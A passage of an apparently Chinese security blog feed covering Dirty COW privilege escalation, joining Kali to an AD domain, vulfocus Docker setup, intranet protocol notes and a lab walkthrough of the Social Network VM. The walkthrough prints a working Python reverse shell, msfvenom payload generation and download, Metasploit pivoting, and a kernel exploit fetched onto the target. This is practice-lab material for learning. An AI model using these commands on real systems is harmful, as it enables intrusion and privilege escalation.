<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">upload linux-exploit-suggester.sh /tmp<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102175702832.png"  ><span class="image-caption">image-20230102175702832</span></p>
<p>然后在shell界面赋权运行</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102181139741.png"  ><span class="image-caption">image-20230102181139741</span></p>
<p>扫出一大堆漏洞，还有著名的脏牛漏洞</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102181245717.png"  ><span class="image-caption">image-20230102181245717</span></p>
<figure class="highlight nix"><table><tr><td class="code"><pre><code class="hljs nix">g++ -Wall -pedantic -O2 <span class="hljs-attr">-std=c++11</span> -pthread -o dcow dcow.cpp -lutil       <span class="hljs-comment">#编译</span><br>python -c &#x27;<span class="hljs-built_in">import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;                         <span class="hljs-comment">#开启交互式，否则无法运行</span><br>./dcow<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102184647440.png"  ><span class="image-caption">image-20230102184647440</span></p>
<p>成功，该exp修改了root密码为dirtyCowFun</p>
<p>试一下</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102184942664.png"  ><span class="image-caption">image-20230102184942664</span></p>
<p>成功</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="脏牛成因"><a href="#脏牛成因" class="headerlink" title="脏牛成因"></a>脏牛成因</h2><p>get_user_page内核函数在处理Copy-on-Write的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Linux kernel &gt;= 2.6.22</p>
<p>编号    CVE-2016-5195</p>
]]></content>
      <categories>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali加入域</title>
    <url>/2023/03/12/Linux%E5%8A%A0%E5%85%A5%E5%9F%9F/</url>
    <content><![CDATA[<h1 id="Kali加入AD域"><a href="#Kali加入AD域" class="headerlink" title="Kali加入AD域"></a>Kali加入AD域</h1><p>kali加入AD域的手工方式</p>
<p>可以实现创建账户,并且可以在kali登陆</p>
<p>首先执行命令进行更新</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">apt update -y</span><br></code></pre></td></tr></table></figure>



<p>然后安装一些工具包</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">apt <span class="hljs-keyword">install </span>-y realmd libnss-sss libpam-sss sssd sssd-tools adcli samba-common-<span class="hljs-keyword">bin </span>oddjob oddjob-mkhomedir packagekit<br></code></pre></td></tr></table></figure>



<p>修改计算机名称，使其匹配AD规则</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> <span class="hljs-string">kali</span>.<span class="hljs-string">sayms</span>.<span class="hljs-string">local</span><br></code></pre></td></tr></table></figure>



<p>禁用VM的DNS</p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl disable <span class="hljs-params">system</span>d-resolved.service<br><br><span class="hljs-params">system</span>ctl stop <span class="hljs-params">system</span>d-resolved.service<br></code></pre></td></tr></table></figure>



<p>修改resolv.conf文件    改为AD的DNS地址</p>
<p>修改linux的ip</p>
<p>检查</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">realm discover sayms.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure>



<p>加入域</p>
<figure class="highlight lasso"><table><tr><td class="code"><pre><code class="hljs lasso">realm <span class="hljs-keyword">join</span> <span class="hljs-params">-U</span> administrator sayms.<span class="hljs-built_in">local</span><br></code></pre></td></tr></table></figure>



<p>确认是否加入</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">realm list</span><br></code></pre></td></tr></table></figure>



<p>现在linux虚拟机已经加入到AD中，我们需要允许AD用户在登录时在linux上创建用户主目录</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/pam-configs/m</span>khomedir<br></code></pre></td></tr></table></figure>



<p>我们将默认值更改为yes，优先级更改为900，并删除会话仅交互式行并保存</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230312224125177.png"  ><span class="image-caption">image-20230312224125177</span></p>
<p>启用PAM配置文件并重新启动PAM服务</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pam-auth-update</span><br></code></pre></td></tr></table></figure>



<p>启用第二个选项，以便在登录时创建主目录</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230312224345508.png"  ><span class="image-caption">image-20230312224345508</span></p>
<p>重新启动sssd，这是一个客户端程序，用于处理用户对AD的远程身份验证</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl restart sssd</span><br></code></pre></td></tr></table></figure>



<p>允许用户通过ssh登录到计算机</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#允许所有用户可以ssh连接</span><br><br><span class="hljs-attribute">realm</span> permit --<span class="hljs-literal">all</span><br></code></pre></td></tr></table></figure>



<p>重启ssh服务</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver">systemctl <span class="hljs-built_in">start</span> ssh.<span class="hljs-built_in">socket</span><br></code></pre></td></tr></table></figure>



<p>启动该服务</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span> ssh.socket<br></code></pre></td></tr></table></figure>



<p>重启kali</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">reboot</span><br></code></pre></td></tr></table></figure>



<p>在AD上创建一个名为kali1的新用户，并尝试登录到linux机器上</p>
<p>现在创建了一个名为kali1@撒野没事.local在AD中</p>
<p>为了快速检查用户是否可以在linux上登录，我们运行命令</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">id</span> useradomain<br></code></pre></td></tr></table></figure>



<p>还需要允许域用户能够在这个linux盒子上运行sudo命令</p>
<p>修改/etc/sudoers.d/domain-admin配置文件</p>
<p>修改为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">%</span>domain\ admins<span class="hljs-variable">@sayms</span>.<span class="hljs-keyword">local</span>		<span class="hljs-keyword">ALL</span><span class="hljs-operator">=</span>(<span class="hljs-keyword">ALL</span>)	<span class="hljs-keyword">ALL</span><br></code></pre></td></tr></table></figure>

<p>意思为允许域内所有用户执行命令</p>
<p>尝试用我们在AD上创建的管理员用户<a href="mailto:&#x6b;&#97;&#108;&#x69;&#49;&#64;&#115;&#x61;&#121;&#109;&#115;&#46;&#x6c;&#111;&#99;&#x61;&#108;">&#x6b;&#97;&#108;&#x69;&#49;&#64;&#115;&#x61;&#121;&#109;&#115;&#46;&#x6c;&#111;&#99;&#x61;&#108;</a>来登陆</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> sayms\\kali1<span class="hljs-variable">@localhost</span><br></code></pre></td></tr></table></figure>



<p>尝试从AD服务器ssh到linux系统</p>
<p>使用ssh连接工具</p>
]]></content>
      <categories>
        <category>域</category>
      </categories>
      <tags>
        <tag>域</tag>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>docker容器vulfocus搭建</title>
    <url>/2023/03/11/docker%E5%AE%B9%E5%99%A8vulfocus%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="docker容器搭建vulfocus"><a href="#docker容器搭建vulfocus" class="headerlink" title="docker容器搭建vulfocus"></a>docker容器搭建vulfocus</h1><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span><br></code></pre></td></tr></table></figure>



<h2 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h2><p>出现这种</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">错误:<span class="hljs-number">3</span> https:<span class="hljs-regexp">//</span>download.docker.com<span class="hljs-regexp">/linux/</span>debian kali-rolling Release<br>  <span class="hljs-number">404</span>  Not Found<br></code></pre></td></tr></table></figure>



<p>则需要</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> /etc/apt/sources.<span class="hljs-keyword">list</span>.d<br><span class="hljs-keyword">ls</span><br>rm docker.<span class="hljs-keyword">list</span> <br>apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span> &amp;&amp; apt-<span class="hljs-built_in">get</span> upgrade<br></code></pre></td></tr></table></figure>

<p>然后重新apt-get update</p>
<h2 id="添加GPG密钥"><a href="#添加GPG密钥" class="headerlink" title="添加GPG密钥"></a>添加GPG密钥</h2><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">curl  -fsSL https:<span class="hljs-regexp">//</span>download.docker.com<span class="hljs-regexp">/linux/</span>debian/gpg | sudo apt-key add -<br></code></pre></td></tr></table></figure>



<h2 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h2><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">echo <span class="hljs-string">&#x27;deb https://download.docker.com/linux/debian stretch stable&#x27;</span>&gt; <span class="hljs-regexp">/etc/</span>apt<span class="hljs-regexp">/sources.list.d/</span>docker.list<br></code></pre></td></tr></table></figure>



<h2 id="导入证书"><a href="#导入证书" class="headerlink" title="导入证书"></a>导入证书</h2><figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">apt</span>-<span class="hljs-meta">get</span> install apt-transport-https  ca-certificates  curl  gnupg2  software-properties-<span class="hljs-meta">common</span><br></code></pre></td></tr></table></figure>



<h2 id="更新-1"><a href="#更新-1" class="headerlink" title="更新"></a>更新</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">update</span> <br></code></pre></td></tr></table></figure>



<h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><figure class="highlight cmake"><table><tr><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> docker.io<br></code></pre></td></tr></table></figure>



<h2 id="查看是否安装完成"><a href="#查看是否安装完成" class="headerlink" title="查看是否安装完成"></a>查看是否安装完成</h2><figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker -v</span><br></code></pre></td></tr></table></figure>



<h2 id="拉取docker镜像"><a href="#拉取docker镜像" class="headerlink" title="拉取docker镜像"></a>拉取docker镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker pull vulfocus/vulfocus:latest<br></code></pre></td></tr></table></figure>



<h2 id="创建vulfocus容器"><a href="#创建vulfocus容器" class="headerlink" title="创建vulfocus容器"></a>创建vulfocus容器</h2><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">docker run -d -p <span class="hljs-number">80</span>:<span class="hljs-number">80</span> -v <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/docker.sock:/</span>var<span class="hljs-regexp">/run/</span>docker.sock  -e VUL_IP=xxx.xxx.xxx.xxx vulfocus/vulfocus<br><br></code></pre></td></tr></table></figure>



<h2 id="查看地址"><a href="#查看地址" class="headerlink" title="查看地址"></a>查看地址</h2><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">docker ps -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure>



<h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> start <span class="hljs-number">6</span>abab70cabc4<br></code></pre></td></tr></table></figure>

<p>然后就能够访问</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>内网协议</title>
    <url>/2023/03/10/%E5%86%85%E7%BD%91%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p><strong><font color='red'>主要是介绍一些内网用到的一些协议 不包括Kerberos和NTLM</font></strong></p>
<h1 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h1><p>轻量型目录访问协议</p>
<p>用于通过分层目录结构对数据进行存储与检索</p>
<p>是一种用来查询与更新AD DS的目录服务通信协议</p>
<p>AD DS使用LDAP名称路径来显示对象AD DS内的位置</p>
<p><strong>LDAP主要是用来进行读取的协议    一般不进行写    因为其读高效 写低效</strong></p>
<h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>SMB(Server Message Block)文件共享协议</p>
<p>SMB协议又名为CIFS协议</p>
<p>开放在445端口</p>
<p>SMB协议在域内和域外是不同的</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">域内SMB走Kerberos协议<br><br>域外SMB走NTLM协议<br></code></pre></td></tr></table></figure>







<h1 id="WPAD"><a href="#WPAD" class="headerlink" title="WPAD"></a>WPAD</h1><p>WPAD(Web Proxy Auto-Discovery Protocol)网络代理自动发现协议</p>
<p>一种客户端使用DHCP或DNS发现方法来定位一个配置文件URL的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定URL应使用的代理</p>
<p>通过让浏览器自动发现代理服务器，定位代理配置文件，下载编译并运行，最终自动使用代理访问网络</p>
<p>简而言之,就是代理时,会用到这个协议</p>
<h1 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h1><p>LLMNR(Link-Local Multicast Name Resolution)链路本地多播名称解析</p>
<p>是一个基于域名系统数据包格式的协议</p>
<p>将局域网内IPV4和IPV6的主机进行名称解析为同一本地链路上的主机,也称作多播DNS</p>
<p>端口为UDP的5355端口</p>
<p>支持Windows vista及其以后的版本</p>
<p>简而言之,就是类似一个地址解析协议</p>
<h1 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h1><p>NetBIOS(Network Basic Input/Output System)网络基本输入输出系统</p>
<p>NetBIOS不是一种网络协议，而是应用程序接口（API）</p>
<p>它提供了OSI模型中的会话层服务，让在不同电脑上运行的不同程序，可以在局域网中，互相连线，以及分享资料</p>
<p>NetBIOS提供的主要服务</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230310173911641.png"  ><span class="image-caption">image-20230310173911641</span></p>
<h1 id="NBNS"><a href="#NBNS" class="headerlink" title="NBNS"></a>NBNS</h1><p>NBNS(NetBIOS name service)</p>
<p>NetBIOS提供的名称服务,可以将名称映射到IP地址</p>
<p>支持IPV4    不支持IPV6</p>
<p>也是类似一种地址解析协议</p>
<p>支持Windows NT及其高版本</p>
<p>几乎所有的局域网都是在NBNS协议基础之上</p>
<h1 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h1><p>RPC(Remote Procedure Call Protocol)远程调用协议</p>
<p>通过网络, 从远程计算上请求服务, 而不需要了解底层网络协议</p>
]]></content>
      <categories>
        <category>协议</category>
      </categories>
      <tags>
        <tag>内网学习</tag>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title>BoredHackerBlog-Social Network靶场</title>
    <url>/2023/03/06/BoredHackerBlog-Social%20Network/</url>
    <content><![CDATA[<h1 id="BoredHackerBlog-Social-Network"><a href="#BoredHackerBlog-Social-Network" class="headerlink" title="BoredHackerBlog-Social Network"></a>BoredHackerBlog-Social Network</h1><p>靶机：192.168.232.133</p>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>netdiscover</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">netdiscover</span>  -r <span class="hljs-number">192.168.43.1</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>

<p>可以扫描一下存在哪些主机</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005153107615.png"  ><span class="image-caption">image-20221005153107615</span></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>nmap扫描端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -A <span class="hljs-number">192.168.232.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>



<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005150720469.png"  ><span class="image-caption">image-20221005150720469</span></p>
<p>发现存在5000端口，Werkzeug是python开发的框架</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>可以用御剑直接扫描</p>
<p>也可以用kali的dirsearch命令</p>
<p>dirsearch扫目录</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dirsearch</span> -u <span class="hljs-number">192.168.232.133:5000</span><br></code></pre></td></tr></table></figure>



<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005155639818.png"  ><span class="image-caption">image-20221005155639818</span></p>
<p>直接扫到了admin</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005155746019.png"  ><span class="image-caption">image-20221005155746019</span></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>前面nmap探测到是基于python开发的框架</p>
<p>寻找python反弹shell的payload</p>
<p>一个反弹shell命令的站：</p>
<p><a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>
<p>生成shell</p>
<figure class="highlight moonscript"><table><tr><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">import</span> socket,subprocess,<span class="hljs-built_in">os</span>;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;192.168.232.132&quot;</span>,<span class="hljs-number">6666</span>));<span class="hljs-built_in">os</span>.dup2(s.fileno(),<span class="hljs-number">0</span>); <span class="hljs-built_in">os</span>.dup2(s.fileno(),<span class="hljs-number">1</span>); <span class="hljs-built_in">os</span>.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<br></code></pre></td></tr></table></figure>



<p>kali设置监听</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">6666</span>        #监听本机的<span class="hljs-number">6666</span>端口<br></code></pre></td></tr></table></figure>



<p>上传payload</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><code class="hljs tcl">import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;192.168.232.132&quot;</span>,<span class="hljs-number">6666</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);<br><br><span class="hljs-comment">#ip是攻击机kali的ip</span><br></code></pre></td></tr></table></figure>



<p>反弹成功</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005161623990.png"  ><span class="image-caption">image-20221005161623990</span></p>
<h2 id="docker容器"><a href="#docker容器" class="headerlink" title="docker容器"></a>docker容器</h2><p>反弹shell后，发现在/app目录下</p>
<p>还发现了dockerfile</p>
<p>怀疑是在docker容器里面</p>
<p>判断是否在docker环境下</p>
<p>三种确定方法<br>方法1：如果根目录下存在dockerenv，那么有极大的概率，我们是在docker环境中<br>方法2：查看ip，如果ip与网站ip不同，那么有极大的概率，我们是在docker环境中<br>方法3：如果/proc/1/cgroup文件里面可以看到docker，以及docker的hash值。那么我们一定在docker环境中。</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005163937983.png"  ><span class="image-caption">image-20221005163937983</span></p>
<p>确定我们是处于docker容器下</p>
<h2 id="shell脚本"><a href="#shell脚本" class="headerlink" title="shell脚本"></a>shell脚本</h2><p>使用msf生成shell</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.232.132 <span class="hljs-attribute">LPORT</span>=1111 -f elf &gt; shell.elf<br></code></pre></td></tr></table></figure>



<p>开启http服务</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure>



<p>从kali主机下载生成的shell</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">wget</span> <span class="hljs-number">192.168.232.132:8000</span>/shell.elf<br></code></pre></td></tr></table></figure>



<p>msf设置监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msfconsole<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.232.132<br><span class="hljs-built_in">set</span> lport 1111<br>exploit<br></code></pre></td></tr></table></figure>



<p>执行shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x shell.elf           <span class="hljs-comment">#给他执行的权力</span><br>./shell                      <span class="hljs-comment">#执行</span><br></code></pre></td></tr></table></figure>



<p>反弹成功</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005170641155.png"  ><span class="image-caption">image-20221005170641155</span></p>
<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>获取网络接口</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> get_local_subnets<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005172016935.png"  ><span class="image-caption">image-20221005172016935</span></p>
<p>添加路由</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">run</span> autoroute -s <span class="hljs-number">172.17.0.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005172337464.png"  ><span class="image-caption">image-20221005172337464</span></p>
<p>探测内网主机</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">run auxiliary<span class="hljs-regexp">/scanner/</span>portscan<span class="hljs-regexp">/tcp rhosts=172.17.0.0/</span><span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005174803761.png"  ><span class="image-caption">image-20221005174803761</span></p>
<p>设置代理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">background    <span class="hljs-comment">#退出会话</span><br>use auxiliary/server/socks_proxy<br><span class="hljs-built_in">set</span> srvhost 192.168.232.132<br><span class="hljs-built_in">set</span> srvport 2222      	<span class="hljs-comment">#2222接口对外开放</span><br>exploit<br></code></pre></td></tr></table></figure>

<p>配置proxychains文件</p>
<p>找到proxychains.conf文件，linux是/etc/proxychain4.conf</p>
<p>把ip改为kali的ip 端口改为刚刚的2222端口</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221003173328944.png"  ><span class="image-caption">image-20221003173328944</span></p>
<p>nmap扫描</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005180118892.png"  ><span class="image-caption">image-20221005180118892</span></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005180131485.png"  ><span class="image-caption">image-20221005180131485</span></p>
<p>9200端口对应的是elasticsearch服务</p>
<p>查询elasticsearch服务的版本</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">proxychains4 curl http:<span class="hljs-regexp">//</span><span class="hljs-number">172.17</span>.<span class="hljs-number">0.2</span>:<span class="hljs-number">9200</span>/ <br></code></pre></td></tr></table></figure>

<p>莫名其妙跑不出来</p>
<p>直接访问查看吧</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005181031876.png"  ><span class="image-caption">image-20221005181031876</span></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接利用msf进行漏洞利用</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">search</span>  elasticsearch<br><span class="hljs-keyword">use</span> exploit/multi/elasticsearch/search_groovy_script<br><span class="hljs-keyword">set</span> rhosts 172.17.0.2<br><span class="hljs-keyword">set</span> rport 9200<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005182328864.png"  ><span class="image-caption">image-20221005182328864</span></p>
<p>ls    发现passwords文件</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005182443027.png"  ><span class="image-caption">image-20221005182443027</span></p>
<p>解码之后</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005182508436.png"  ><span class="image-caption">image-20221005182508436</span></p>
<p>ssh尝试登陆，只有john能登陆</p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>查看内核版本</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221005184523125.png"  ><span class="image-caption">image-20221005184523125</span></p>
<p>内核版本比较低，可以尝试内核提权</p>
<p>查找漏洞库</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> linux <span class="hljs-number">3</span>.<span class="hljs-number">13</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221006160842554.png"  ><span class="image-caption">image-20221006160842554</span></p>
<p>查看exp代码发现代码末尾会调用gcc来编译ofs-lib.c文件，因为靶机上没有gcc环境，所以不能在靶机上直接运行。<br>我们可以把ofs-lib.so文件和exp文件一同上传到靶机，改成只是调用文件，编译代码操作我们在kali本地完成,这时代码里的编译文件的代码也就不需要了，删除方框内编译代码即可</p>
<p>下载一份payload到本地攻击机</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">cp <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/exploitdb/</span>exploits<span class="hljs-regexp">/linux/</span>local/<span class="hljs-number">37292</span>.c .<br></code></pre></td></tr></table></figure>



<p>注释掉一部分代码</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221006161852478.png"  ><span class="image-caption">image-20221006161852478</span></p>
<p>在本地编译一下</p>
<figure class="highlight r"><table><tr><td class="code"><pre><code class="hljs r">gcc <span class="hljs-operator">-</span>o <span class="hljs-built_in">exp</span> <span class="hljs-number">37292.</span><span class="hljs-built_in">c</span><br></code></pre></td></tr></table></figure>



<p>查找ofs-lib.so文件，并复制到和exp相同的文件下</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> /usr -name ofs-lib.so<br>cp <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>data<span class="hljs-regexp">/exploits/</span>CVE-<span class="hljs-number">2015</span>-<span class="hljs-number">1328</span><span class="hljs-regexp">/ofs-lib.so ./</span><br></code></pre></td></tr></table></figure>



<p>kali开启一个服务</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure>



<p>然后在靶机上面下载刚刚生成的两个文件</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">wget</span> <span class="hljs-number">192.168.232.132:8000</span>/exp<br>wget <span class="hljs-number">192.168.232.132:8000</span>/ofs-lib.so<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20221006163608422.png"  ><span class="image-caption">image-20221006163608422</span></p>
<p>执行exp即可</p>
